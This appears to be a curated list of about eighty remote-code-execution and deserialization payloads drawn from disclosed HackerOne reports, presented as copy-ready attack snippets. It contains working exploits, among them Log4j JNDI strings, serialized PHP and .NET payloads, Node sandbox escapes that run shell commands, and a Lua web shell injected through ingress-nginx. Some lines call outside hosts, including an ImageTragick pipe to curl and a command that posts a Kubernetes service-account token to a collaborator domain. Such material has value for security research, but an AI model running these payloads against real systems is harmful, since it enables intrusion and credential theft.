# Code Injection & Insecure Deserialization (RCE)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1356845](https://hackerone.com/reports/1356845)  -  CVE-2021-40870 on [52.204.160.31]
*critical*

```http
POST /v1/backend1 HTTP/1.1
Host: 52.204.160.31
Content-Length: 136
Content-Type: application/x-www-form-urlencoded

CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE<?php phpinfo()?>
```

## 2. [#1442644](https://hackerone.com/reports/1442644)  -  Log4j Java RCE in [beta.dev.adobeconnect.com]
*critical*

```http
GET /?x=${jndi:ldap://${hostName}.dq7iqbvjiufrlpt5mri9dvpb42atyi.burpcollaborator.net/a} HTTP/1.1
Host: beta.dev.adobeconnect.com
Cookie: BREEZESESSION=breezdiekv3smcc2xdw3u; BreezeCCookie=conn-BZTI-9BM9-2M7O-HWCG-XCF2-KDFT-KN7O-Y78S
```

## 3. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint
*medium, $300*

```http
GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

## 4. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint
*medium, $300*

```http
GET /dashboard/Campaign/json_status/http%3A%2F%2F51.178.47.176%2Fo.php%3Fs%3Dhttp%3A%2F%2F51.178.47.176%2Ftest HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

## 5. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint
*medium, $300*

```http
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445 HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

## 6. [#895696](https://hackerone.com/reports/895696)  -  Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint
*medium, $300*

```http
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A443 HTTP/1.1
Host: labs.data.gov
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9…
```

## 7. [#350401](https://hackerone.com/reports/350401)  -  Insecure implementation of deserialization in funcster
*high*

```json
{ __js_function: "function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}/*process.stdout.write(JSON.stringify(a))*/;var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};var x= spawnSync('whoami'); process.stdout.write(x.output.toString());}()"}
# … truncated …
```

## 8. [#1459714](https://hackerone.com/reports/1459714)  -  [CVE-2021-44228] Arbitrary Code Execution on ng01-cloud.acronis.com
*critical*

```bash
curl --http1.1 --silent --output /dev/null \
--header 'User-agent: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'X-Forwarded-For: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
--header 'Referer: ${jndi:ldap://${hostName}.<COLLABORATOR_URL>/a}' \
https://ng01-cloud.acronis.com
```

## 9. [#1728174](https://hackerone.com/reports/1728174)  -  Ingress nginx annotation injection causes arbitrary command execution
*high, $2,500*

```http
GET /suanve/ HTTP/1.1
Host: suanve.susec.me
Content-Length: 2
```

## 10. [#1356845](https://hackerone.com/reports/1356845)  -  CVE-2021-40870 on [52.204.160.31]
*critical*

```http
GET /v1/1yv4QQmkj4h4OdmmyT11tkiGf5M.php HTTP/1.1
Host: 52.204.160.31
Content-Type: application/x-www-form-urlencoded
```

## 11. [#1728174](https://hackerone.com/reports/1728174)  -  Ingress nginx annotation injection causes arbitrary command execution
*high, $2,500*

```shell
curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET /suanve/ HTTP/1.1
> Host: suanve.susec.me
> User-Agent: curl/7.79.1
> Accept: */*
> cmd: id
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 10 Oct 2022 09:58:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
uid=101(www-data) gid=82(www-data) groups=82(www-data)
```

## 12. [#3782701](https://hackerone.com/reports/3782701)  -  Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
*critical, $12,000*

```bash
curl -s https://firefox-ci-tc.services.mozilla.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(\"RCE_\"+(6*7)+\"_\"+(typeof process))})()"}}}'
```

## 13. [#3782701](https://hackerone.com/reports/3782701)  -  Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
*critical, $12,000*

```bash
curl -s https://firefox-ci-tc.services.mozilla.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(process.getBuiltinModule(\"child_process\").execSync(\"id\").toString())})()"}}}'
```

## 14. [#1044716](https://hackerone.com/reports/1044716)  -  SQL Injection in www.hyperpure.com
*critical, $2,000*

```http
PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
Content-Type: application/json;charset=utf-8
Content-Length: 246
```

## 15. [#2762119](https://hackerone.com/reports/2762119)  -  CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
*critical*

```http
GET /__ HTTP/1.1
Host: lonidoor.mtn.ci
X-Requested-With: XMLHttpRequest
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Se…
```

## 16. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```http
GET /api/staff/ HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 17. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```bash
curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:"GMP":106:{s:1:"5"%3ba:2:{s:5:"cache"%3ba:1:{s:5:"index"%3bs:14:"{${phpinfo()}}"%3b}i:0%3bO:12:"DateInterval":1:{s:1:"y"%3bR:2%3b}}}}' http://127.0.0.1/mybb/
```

## 18. [#660563](https://hackerone.com/reports/660563)  -  [script-manager] Unintended require
*low*

```
const request = require('request')
    const host = 'localhost'
    let stopEnum = false
    
    /*
     * Sends crafted HTTP request to specific port
     * in order to check if it is the app we are looking for and exploit it
     * 
     * @param {number} port - port number
     * @returns {Promise}
     */
    async function sendRequestToPort(port) {
      return new Promise((resolve, reject) => {
        request.post(
          {
            url: `http://${host}:${port}`,
            // sending json with path to js file we want to execute
            // https://github.com/pofider/node-script-manager/blob/master/lib/worker-servers.js#L268
            json: {"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}
          },
          (err, req, body) => {
            process.stdout.write(`requested http://${host}:${port}\r`)
            // if there is specific response with the error message it means that we found our server
            // and code was executed
            if (body && body.error && body.error.message === 'require(...) is not a function') {
              console.log(`port is ${port}`)
              stopEnum = true
            }
            resolve()
          }
        )
      })
    }
    
    (async function main(){
# … truncated …
```

## 19. [#566056](https://hackerone.com/reports/566056)  -  [larvitbase-api] Unintended Require
*medium*

```bash
curl --path-as-is 'http://localhost:8001/../../../../../../hack'
```

## 20. [#579560](https://hackerone.com/reports/579560)  -  [larvitbase-www] Unintended Require
*medium*

```bash
curl --path-as-is 'http://localhost:8001/../hack'
```

## 21. [#894308](https://hackerone.com/reports/894308)  -  Arbitrary code execution via untrusted schemas in is-my-json-valid
*medium*

```js
const validator = require('is-my-json-valid')
const schema = {
  type: 'object',
  properties: {
    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
      required: true,
      type:'string'
    }
  },
}
var validate = validator(schema);
validate({})
```

## 22. [#403402](https://hackerone.com/reports/403402)  -  Public Jenkins instance with /script enabled
*critical*

```
"curl http://169.254.169.254/latest/meta-data/".execute().text
```

## 23. [#2762119](https://hackerone.com/reports/2762119)  -  CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci
*critical*

```
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke --help
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, write_file,
                               run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file
                               mode.
  -f, --file=VALUE           the file to read in read_file mode or the file
                               to write to in write_file_mode.
      --minify               Whether to minify the payloads where applicable
                               (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple.
                               Default: true
```

## 24. [#851807](https://hackerone.com/reports/851807)  -  Code injection possible with malformed Nextcloud Talk chat commands
*high*

```
/wiki test $(id)
    /wiki test $(pwd)
    /wiki test $(ls -al .)
    /calc test $(cat /etc/passwd)
    /calc test $(ls -al ../)
```

## 25. [#1115864](https://hackerone.com/reports/1115864)  -  Persistant Arbitrary code execution in mattermost android
*high*

```
public static String getPathFromSavingTempFile(Context context, final Uri uri) {
             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here 
            returnCursor.moveToFirst();
            fileName = returnCursor.getString(nameIndex); // "filename=../../lib-main/libyoga.so"
        } catch (Exception e) {
            // just continue to get the filename with the last segment of the path
       }
             String mimeType = getMimeType(uri.getPath());
            tmpFile = new File(cacheDir, fileName);
            tmpFile.createNewFile();  //path transversal here
            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, "r"); 
            //.../
```

## 26. [#809012](https://hackerone.com/reports/809012)  -  [notevil] - Sandbox Escape Lead to RCE on Node.js and XSS in the Browser
*high*

```json
[
  {
    "key": "comments",
    "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()",
    "type": "radios",
    "titleMap": [
      {
        "value": "S",
        "name": "Shipping"
      },
      {
        "value": "P",
        "name": "Pickup"
      }
    ]
  }
]
```

## 27. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```ruby
def _parse_driver(driver)
      driver = driver.to_s if driver.is_a?(Symbol)

      if driver.kind_of?(String)
        begin
          require_relative "connection/#{driver}"
        rescue LoadError, NameError => e
          begin
            require "connection/#{driver}"
          rescue LoadError, NameError => e
            raise RuntimeError, "Cannot load driver #{driver.inspect}: #{e.message}"
          end
        end

        driver = Connection.const_get(driver.capitalize)
      end

      driver
    end
```

## 28. [#402362](https://hackerone.com/reports/402362)  -  RCE due to ImageTragick v2
*critical, $2,000*

```http
PATCH /design
Host: manage.booth.pm

send following image:
```

## 29. [#897974](https://hackerone.com/reports/897974)  -  Arbitrary code execution via untrusted schemas in ajv
*low*

```js
const ajv = require('ajv')({})
const payload = "(console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`)),process.exit(0))"
const schemaJSON =`
{
  "properties": {
    "){}}};${payload};return validate//": {
      "allOf": [{}]
    }
  }
}
`
ajv.compile(JSON.parse(schemaJSON))
```

## 30. [#921288](https://hackerone.com/reports/921288)  -  Arbitrary File delete via PHAR deserialization
*high*

```php
<?php
     // input_path is phar://path/to/file
     $sanitized_path = "/" . $input_path;
     // sanitized_path is /phar://path/to/file
     // Therefore, PHP wouldn't recognize that file is phar wrapped file.
     is_dir($sanitized_path);
     ?>
```

## 31. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```
../../../../redirect?url=https://software.bountypay.h1ctf.com/?
```

## 32. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```
../../../../redirect?url=https://software.bountypay.h1ctf.com/uploads?
```

## 33. [#1215263](https://hackerone.com/reports/1215263)  -  Download of file with arbitrary extension via injection into attachment header
*medium, $125*

```http
GET /nextcloud/index.php/apps/mail/api/messages/26/attachment/2 HTTP/1.1
    Host: 192.168.0.101

HTTP/1.1 200 OK
    [...]
    Content-Disposition: attachment; filename="test.bat".png"
    [...]
    Content-Type: application/octet-stream

    C:\Windows\system32\calc.exe
```

## 34. [#1350444](https://hackerone.com/reports/1350444)  -  A bypass of adding remote files in concrete5 FIlemanager leads to remote code execution
*medium*

```python
EXPLOIT="<?php phpinfo(); "
class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'Current time: {datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")}')
        self.send_response(200)
        self.send_header("Content-type", "image/jpeg")
        self.end_headers()
        self.wfile.write(EXPLOIT.encode('utf-8'))
        if self.path == "/stuck":
            time.sleep(10)
```

## 35. [#2182202](https://hackerone.com/reports/2182202)  -  Remote code execution [CVE-2023-36845]
*critical*

```bash
curl -sk "https://41.205.30.222/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'
```

## 36. [#2248328](https://hackerone.com/reports/2248328)  -  RCE on Wordpress website
*critical*

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: nextcloud.com' \
    -b $'nc_cookie_banner={\"essentials\":true,\"convenience\":false,\"statistics\":{\"matomo\":false},\"external_media\":{\"youtube\":false,\"vimeo\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \
    $'https://nextcloud.com/newsletter/'
```

## 37. [#346516](https://hackerone.com/reports/346516)  -  Remote code executio in  NPM package getcookies
*critical*

```bash
curl -i 'http://localhost:3000/' -H 'X-Hacker: g0000h636465i'
```

## 38. [#346516](https://hackerone.com/reports/346516)  -  Remote code executio in  NPM package getcookies
*critical*

```bash
curl -i 'http://localhost:3000/' -H 'X-Hacker: gfaffh636465i'
```

## 39. [#1838674](https://hackerone.com/reports/1838674)  -  Remote Code Execution on ownCloud instances with ImageMagick installed
*critical*

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image> 
  <read filename="/mnt/data/files/admin/files/Photos/Portugal.jpg" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <comment>&lt;?php echo php_uname(); ?&gt;</comment>
  <write filename="/var/www/owncloud/index.php" />
</image>
```

## 40. [#3694007](https://hackerone.com/reports/3694007)  -  Authenticated Elasticsearch Painless script execution via Query.search.sort_query on hackerone.com/graphql
*high, $7,000*

```bash
curl -sk 'https://hackerone.com/graphql' -H @/tmp/h1.headers -b "$COOKIE" \
  --data-raw '{"query":"{me{_id username}}"}' | jq
```

## 41. [#1620702](https://hackerone.com/reports/1620702)  -  RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field
*high, $2,500*

```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

## 42. [#1620702](https://hackerone.com/reports/1620702)  -  RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field
*high, $2,500*

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## 43. [#2039464](https://hackerone.com/reports/2039464)  -  Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation
*high, $2,500*

```bash
curl -v --resolve "kubernetes.api:8080:127.0.0.1" http://kubernetes.api:8080/api/v1/namespaces/kube-system/secrets/
```

## 44. [#2701701](https://hackerone.com/reports/2701701)  -  Injection in path parameter of Ingress-nginx
*high*

```sh
curl http://f292392.com/f292392body/ --resolve f292392.com:80:4.178.145.81 -k -vv --data-binary '@./exploit.txt'
```

## 45. [#2701701](https://hackerone.com/reports/2701701)  -  Injection in path parameter of Ingress-nginx
*high*

```bash
curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
```

## 46. [#403402](https://hackerone.com/reports/403402)  -  Public Jenkins instance with /script enabled
*critical*

```
http://169.254.169.254/latest/meta-data/
```

## 47. [#781664](https://hackerone.com/reports/781664)  -  Several simple remote code execution in pdf-image
*critical*

```
; sleep 500
```

## 48. [#390881](https://hackerone.com/reports/390881)  -  Code Injection Vulnerability in morgan Package
*medium*

```js
var morgan = require('morgan');
var f = morgan('25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms');
f({}, {}, function () {
});
```

## 49. [#390881](https://hackerone.com/reports/390881)  -  Code Injection Vulnerability in morgan Package
*medium*

```js
var morgan = require('morgan');
//payload delivered through a prototype pollution attack
Object.prototype[':method :url :status :res[content-length] - :response-time ms'] = '25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms';
//benign looking usage of morgan that can be exploited due to the prototype pollution attack
var f = morgan(':method :url :status :res[content-length] - :response-time ms');
f({}, {}, function () {
});
```

## 50. [#415258](https://hackerone.com/reports/415258)  -  RCE: DnDing shortcut files to chrome://brave allows loading HTML files in Muon's context
*high*

```html
<script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
```

## 51. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```html
<script>
            var form = document.getElementById("pwn-form");
            form.submit();
        </script>
```

## 52. [#783877](https://hackerone.com/reports/783877)  -  Remote Code Execution in Slack desktop apps + bonus
*critical*

```html
<html>
<body>
<script>
  // overwrite functions to get a BrowserWindow object:
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank') // leak BrowserWindow class
  nbw = new bw.constructor({show: false, webPreferences: {nodeIntegration: true}}) // let's make our own with nodeIntegration
  nbw.loadURL('about:blank') // need to load some URL for interaction
  nbw.webContents.executeJavaScript('this.require("child_process").exec("open /Applications/Calculator.app")') // exec command
</script>
</body>
</html>
```

## 53. [#783877](https://hackerone.com/reports/783877)  -  Remote Code Execution in Slack desktop apps + bonus
*critical*

```html
<html>
<body>
<script>
  window.desktop.delegate = {}
  window.desktop.delegate.canOpenURLInWindow = () => true
  window.desktop.window = {}
  window.desktop.window.open = () => 1
  bw = window.open('about:blank')
  nbw = new bw.constructor({show: false}) // node not necessary for this demo
  nbw.loadURL('https://app.slack.com/robots.txt') // robots.txt for speed, app.slack.com gives us the user's full environment 
  nbw.webContents.executeJavaScript('alert(JSON.stringify(localStorage))')
</script>
</body>
</html>
```

## 54. [#889886](https://hackerone.com/reports/889886)  -  [H1-2006 2020]  Connecting the dots to send hackers their Bug Bounty
*critical*

```
Now once we see the input field we can see its function handling submitInfo requires  if (str.equals(sb.toString())) which here checks if value Entered is X-Token or not so we simply enter the value and bypass to third activity

## On Third  Activity
Now the third activity was the main thing here we can see that PartThreeActivity function has a run function which will  fetches a token 
now to perform this action 
{F853430}
we can call our deeplink as three://part here parameters are three switch and header but the first two paramter require a base 64 value next on condition check we can see the switch parameter require PartThreeActivity:UGFydFRocmVlQWN0aXZpdHk= as its value switch:b24  requires on its value and header as X-Token
So after passing the deeplink via adb "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"
we can observe the adb logact throws us
```

## 55. [#1115864](https://hackerone.com/reports/1115864)  -  Persistant Arbitrary code execution in mattermost android
*high*

```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
    return matrixCursor;
}

public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
}
```

## 56. [#390929](https://hackerone.com/reports/390929)  -  Code Injection Vulnerability in dot Package
*high*

```js
var doT = require("dot");
// prototype pollution attack vector
Object.prototype.templateSettings = {varname:"a,b,c,d,x=console.log(25)"};
// benign looking template compilation + application
var dots = require("dot").process({path: "./resources"});
dots.mytemplate();
```

## 57. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```
../../../../../../../../../../tmp/a.rb`
```

## 58. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```
../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f
```

## 59. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```
../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea
```

## 60. [#1425474](https://hackerone.com/reports/1425474)  -  [CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day
*critical, $1,000*

```
${jdni:ldap://nps.acronis.com.<your-server>/test}
```

## 61. [#1356845](https://hackerone.com/reports/1356845)  -  CVE-2021-40870 on [52.204.160.31]
*critical*

```
../../../var/www/php/1yv4QQmkj4h4OdmmyT11tkiGf5M.php&data=RCE
```

## 62. [#3619288](https://hackerone.com/reports/3619288)  -  RCE + PAT Exfiltration via pull_request_target in privacy-configuration/auto-respond-pr.yml  -  Direct Supply Chain to All DDG Browsers
*critical*

```
${{ github.event.pull_request.head.repo.full_name }
```

## 63. [#1442644](https://hackerone.com/reports/1442644)  -  Log4j Java RCE in [beta.dev.adobeconnect.com]
*critical*

```
${jndi:ldap://${hostName}
```

## 64. [#2221404](https://hackerone.com/reports/2221404)  -  RCE on worker host due to unsanitized "env" variable name in task definition on community-tc.services.mozilla.com
*low, $500*

```
; whoami
```

## 65. [#1776476](https://hackerone.com/reports/1776476)  -  CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example
*high, $4,000*

```json
{{ run_id }}
```

## 66. [#1776476](https://hackerone.com/reports/1776476)  -  CVE-2022-40127: RCE in Apache Airflow <2.4.0 bash example
*high, $4,000*

```json
{{ dag_run }}
```

## 67. [#198734](https://hackerone.com/reports/198734)  -  GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]
*high*

```
${phpinfo()}
```

## 68. [#1115864](https://hackerone.com/reports/1115864)  -  Persistant Arbitrary code execution in mattermost android
*high*

```
../../lib-main/libyoga.so
```

## 69. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```
../../../pwn.js
```

## 70. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```
../../../data/pwn.js/content.js
```

## 71. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```
${process.argv[4]}
```

## 72. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```
${start}
```

## 73. [#660565](https://hackerone.com/reports/660565)  -  [jsreport] Remote Code Execution
*high*

```
${finish}
```

## 74. [#390929](https://hackerone.com/reports/390929)  -  Code Injection Vulnerability in dot Package
*high*

```json
{{=console.log(23)}}
```

## 75. [#1125425](https://hackerone.com/reports/1125425)  -  RCE via unsafe inline Kramdown options when rendering certain Wiki pages
*critical, $20,000*

```
wrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb
lib/gitlab/other_markup.rb:11:in `render'
app/helpers/markup_helper.rb:280:in `other_markup_unsafe'
app/helpers/markup_helper.rb:145:in `markup_unsafe'
app/helpers/markup_helper.rb:130:in `render_wiki_content'
app/views/shared/wikis/show.html.haml:30
```

## 76. [#3782701](https://hackerone.com/reports/3782701)  -  Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)
*critical, $12,000*

```js
const $where = (params, ownerQuery, options) => {
  let test;
  if (isFunction(params)) {
    test = params;
  } else if (!process.env.CSP_ENABLED) {
    test = new Function("obj", "return " + params);   // <-- string becomes code
  } else {
    throw new Error(`In CSP mode, sift does not support strings in "$where" condition`);
  }
  return new EqualsOperation((b) => test.bind(b)(b), ownerQuery, options);
};
```

## 77. [#402362](https://hackerone.com/reports/402362)  -  RCE due to ImageTragick v2
*critical, $2,000*

```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

## 78. [#2248328](https://hackerone.com/reports/2248328)  -  RCE on Wordpress website
*critical*

```php
add_filter( 'ninja_forms_render_default_value', 'nc_change_nf_default_value', 10, 3 );
function nc_change_nf_default_value( $default_value, $field_type, $field_settings ) {
    
    if(isset($_COOKIE['nc_form_fields'])){
        $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));

        if( str_contains($field_settings['key'], 'name') && !str_contains($field_settings['key'], 'organization') ){
                if(isset($nc_form_fields['nc_form_name'])) {
                    $default_value = $nc_form_fields['nc_form_name'];
                }
        }
        if( str_contains($field_settings['key'], 'email') ){
                if(isset($nc_form_fields['nc_form_email'])) {
                    $default_value = $nc_form_fields['nc_form_email'];
                }
        }
        if( str_contains($field_settings['key'], 'phone') ){
                if(isset($nc_form_fields['nc_form_phone'])) {
                    $default_value = $nc_form_fields['nc_form_phone'];
                }
        }
    }

  return $default_value;
}
```

